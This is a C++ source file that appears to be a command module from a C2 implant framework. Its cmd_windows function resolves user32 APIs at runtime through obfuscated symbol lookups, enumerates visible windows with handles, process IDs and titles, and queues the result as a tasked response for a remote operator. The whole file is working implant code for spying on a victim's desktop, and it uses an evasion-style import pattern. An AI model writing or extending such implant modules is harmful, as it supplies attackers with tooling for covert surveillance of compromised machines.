#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_WINDOWS

using namespace stardust;
using namespace starburst;

typedef BOOL (WINAPI *fn_EnumWindows)( WNDENUMPROC, LPARAM );
typedef BOOL (WINAPI *fn_IsWindowVisible)( HWND );
typedef int  (WINAPI *fn_GetWindowTextW)( HWND, LPWSTR, int );
typedef DWORD (WINAPI *fn_GetWindowThreadProcessId)( HWND, LPDWORD );

struct WindowEnumCtx {
    instance*             inst;
    char*                 buf;
    uint32_t              off;
    uint32_t              cap;
    fn_IsWindowVisible    pIsWindowVisible;
    fn_GetWindowTextW     pGetWindowTextW;
    fn_GetWindowThreadProcessId pGetWindowThreadProcessId;
};

static BOOL CALLBACK declfn window_enum_callback( HWND hwnd, LPARAM lp ) {
    auto ctx = reinterpret_cast<WindowEnumCtx*>( lp );
    if ( !ctx || ctx->off + 320 >= ctx->cap ) return FALSE;

    if ( !ctx->pIsWindowVisible( hwnd ) ) return TRUE;

    wchar_t title_w[256] = { 0 };
    int title_len = ctx->pGetWindowTextW( hwnd, title_w, 255 );
    if ( title_len <= 0 ) return TRUE;

    DWORD pid = 0;
    ctx->pGetWindowThreadProcessId( hwnd, &pid );

    // HWND value
    char num[20];
    uint64_t hwnd_val = reinterpret_cast<uint64_t>( hwnd );
    // format as hex
    char hex_chars[] = { '0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F' };
    char hex_buf[20] = { 0 };
    int hex_off = 0;
    ctx->buf[ctx->off++] = '0';
    ctx->buf[ctx->off++] = 'x';
    // convert hwnd to hex
    if ( hwnd_val == 0 ) {
        ctx->buf[ctx->off++] = '0';
    } else {
        char tmp[16];
        int tmp_len = 0;
        uint64_t v = hwnd_val;
        while ( v > 0 ) {
            tmp[tmp_len++] = hex_chars[v & 0xF];
            v >>= 4;
        }
        // reverse
        for ( int i = tmp_len - 1; i >= 0; i-- ) {
            ctx->buf[ctx->off++] = tmp[i];
        }
    }
    ctx->buf[ctx->off++] = '\t';

    // PID
    int_to_str( num, pid, 10 );
    uint32_t plen = str_len( num );
    memory::copy( ctx->buf + ctx->off, num, plen );
    ctx->off += plen;
    ctx->buf[ctx->off++] = '\t';

    // title (wide to narrow)
    char title[260] = { 0 };
    ctx->inst->kernel32.WideCharToMultiByte( CP_ACP, 0, title_w, -1, title, 260, nullptr, nullptr );
    uint32_t tlen = str_len( title );
    if ( ctx->off + tlen + 2 < ctx->cap ) {
        memory::copy( ctx->buf + ctx->off, title, tlen );
        ctx->off += tlen;
    }

    ctx->buf[ctx->off++] = '\n';
    return TRUE;
}

auto declfn starburst::cmd_windows(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    (void)params;

    auto h_user32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );
    if ( !h_user32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
        return;
    }

    auto pEnumWindows = reinterpret_cast<fn_EnumWindows>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "EnumWindows" ) ) );
    auto pIsWindowVisible = reinterpret_cast<fn_IsWindowVisible>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "IsWindowVisible" ) ) );
    auto pGetWindowTextW = reinterpret_cast<fn_GetWindowTextW>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "GetWindowTextW" ) ) );
    auto pGetWindowThreadProcessId = reinterpret_cast<fn_GetWindowThreadProcessId>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "GetWindowThreadProcessId" ) ) );

    if ( !pEnumWindows || !pIsWindowVisible || !pGetWindowTextW || !pGetWindowThreadProcessId ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
        return;
    }

    uint32_t buf_cap = 32768;
    auto output = static_cast<char*>( inst.heap_alloc( buf_cap ) );
    if ( !output ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    // header
    str_copy( output, symbol<char*>( const_cast<char*>( "HWND\tPID\tTitle\n" ) ) );
    uint32_t hdr_len = str_len( output );

    WindowEnumCtx ctx = {};
    ctx.inst = &inst;
    ctx.buf  = output;
    ctx.off  = hdr_len;
    ctx.cap  = buf_cap;
    ctx.pIsWindowVisible          = pIsWindowVisible;
    ctx.pGetWindowTextW           = pGetWindowTextW;
    ctx.pGetWindowThreadProcessId = pGetWindowThreadProcessId;

    pEnumWindows( window_enum_callback, reinterpret_cast<LPARAM>( &ctx ) );

    output[ctx.off] = '\0';
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
